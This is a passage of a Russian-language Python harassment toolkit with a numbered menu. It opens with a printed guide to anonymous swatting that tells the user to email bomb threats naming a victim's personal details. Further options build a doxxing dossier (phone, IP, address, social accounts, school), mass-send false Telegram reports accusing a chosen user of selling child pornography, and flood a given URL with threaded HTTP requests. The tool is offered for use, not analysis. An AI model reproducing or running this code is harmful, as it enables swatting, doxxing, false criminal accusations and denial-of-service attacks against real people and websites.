6. Загрузка Proton VPN на второй виртуальной машине.
7. Загрузка Tor Browser или Firefox с плагинами на последнюю виртуальную машину.
8. Посещение сайта Proton Mail для более безопасного использования.
9. Настройка браузера Firefox внутри виртуальной машины для обеспечения улучшенной защиты от отслеживания и удаления куки-файлов.

Для отправки электронной почты через Proton Mail рекомендуется включить антифрод (цензурирование определенных слов в письме).

После составления письма, которое будет привлекательным для получателя, рекомендуется отправить его не менее чем на 20 адресов электронной почты. Обязательно укажите контактные данные жертвы, такие как ФИО и номер телефона или карты.

Следите за временем и местоположением жертвы, избегайте отправки писем в неподходящее время, чтобы добиться наилучших результатов. При желании можно представляться любым человеком и заминировать любое здание. Указание контактных данных увеличит вероятность заинтересованности получателя.
            """
            print(swat)
        elif choice == '78':
            print(
                "Введите данные в соответствии с запросом, если на запрос данных нету можете пропустить запрос нажав enter\n")

            dokser = input(" Введите имя пользователя доксера - ")
            number = input(" Введите номер телефона жертвы - ")
            country = input(" Введите страну жертвы - ")
            region = input(" Введите город жертвы - ")
            operator = input(" Введите мобильный оператор жертвы -> ")
            ip = input(" Введите IP жертвы - ")
            adress = input(" Введите адрес жертвы - ")
            name = input(" Введите Имя жертвы - ")
            familia = input(" Введите фамилию жертвы - ")
            otchestvo = input(" Введите отчество жертвы - ")
            vk = input(" Введите ссылку на профиль ВК жертвы - ")
            ok = input(" Введите ссылку на профиль ОК жертвы - ")
            tg = input(" Введите имя пользователя telegeram жертвы - ")
            tgid = input(" Введите telegram ID жертвы - ")
            viber = input(" Введите ссылку на профиль viber жертвы - ")
            shcool = input(" Введите номер школы жертвы - ")
            adresschool = input(" Введите адрес школы жертвы - ")

            data = """doks by. """ + dokser + """\n
            [+]Номер
            └ """ + number + """\n
            [+]Страна
            └ """ + country + """\n
            [+]Город
            └ """ + region + """\n
            [+]Оператор
            └ """ + operator + """
            [+]IP
            └ """ + ip + """\n
            [+]Адрес
            └ """ + adress + """\n
            [+]Имя
            └ """ + name + """\n
            [+]Фамилия
            └ """ + familia + """\n
            [+]Отчество
            └ """ + otchestvo + """\n
            [+]Вконтакте
            └ """ + vk + """\n
            [+]Однокласники
            └ """ + ok + """\n
            [+]мя пользователя telegram
            └ """ + tg + """\n
            [+]Telegram ID
            └ """ + tgid + """\n
            [+]Viber
            └ """ + viber + """\n
            [+]Школа
            └ """ + shcool + """\n
            [+]Адрес школы
            └ """ + adresschool + """"""

            print(data)
            import random
        elif choice == '65':
            person = generate_random_person()
            print(f"Name: {person['first_name']} {person['last_name']}")
            print(f"Age: {person['age']}")
            print(f"Profession: {person['profession']}")
            print(f"Nationality: {person['nationality']}")


        elif choice == '62':
            num_lines = get_user_input('введи сколько нужно строк: ', lambda x: int(x) if int(x) > 0 else ValueError(
                'Пожалуйста, введите корректное количество строк (целое число больше 0).'))
            comma_frequency = get_user_input(
                'Через сколько строк нужно ставить запятую (Рекомендовано через 20 строк): ',
                lambda x: int(x) if int(x) > 0 else ValueError(
                    'Пожалуйста, введите корректное значение для частоты запятых (целое число больше 0).'))
            typo_level = get_user_input('Введите уровень опечаток (от 1 до 3): ',
                                        lambda x: int(x) if int(x) in [1, 2, 3] else ValueError(
                                            'Пожалуйста, введите корректный уровень опечаток (1, 2 или 3).'))

            generate_text_with_typos(num_lines, comma_frequency, typo_level)
        elif choice == '63':
            user_input = input("Напишите имя пользователя обидчика: ").strip()

            if not user_input:
                print("Вы не ввели значение. Попробуйте снова.")
                return

            subject = "Помогите Telegram"
            body = (
                f"Добрый день, прошу заблокировать доступ к порнографическому контенту. Пользователь с именем @{user_input} продает детскую порнографию. Прошу принять меры по удалению аккаунта. Спасибо."
            )

            sender_index = 0
            for recipient_email in email_list:
                sender = senders[sender_index]
                success = send_email(sender['email'], sender['password'], subject, body, recipient_email)
                if success:
                    print(f"Жалоба успешно отправлена на {recipient_email} от {sender['email']}")
                else:
                    print(f"Не удалось отправить жалобу на {recipient_email} от {sender['email']}")
                sender_index = (sender_index + 1) % len(senders)
        elif choice == '64':
            s = 0
            url = input("Введите URL - ")
            num_requests = int(input("Введите количество запросов - "))
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
            ]

            def send_request(i):
                user_agent = random.choice(user_agents)
                headers = {"User-Agent": user_agent}
                try:
                    response = requests.get(url, headers=headers)
                    print(f"Request {i} sent successfully\n")
                except:
                    print(f"Request {i} failed\n")

            threads = []
            for i in range(1, num_requests + 1):
                t = threading.Thread(target=send_request, args=[i])
                t.start()
                threads.append(t)

            for t in threads:
                t.join()
        elif choice == '66':
            proxy_url = "https://hmy.name/proxy-list/"
            proxies = fetch_proxy_list(proxy_url)
            if proxies:
                random_proxy = generate_random_proxy(proxies)
                print(f"Random Proxy: {random_proxy}")
        elif choice == '79':
            print("Выход из программы.")
            break
        else:
            print("Неверный выбор. Пожалуйста, выберите существующий пункт меню.")
# Запуск основного меню
if __name__ == "__main__":
    main_menu()
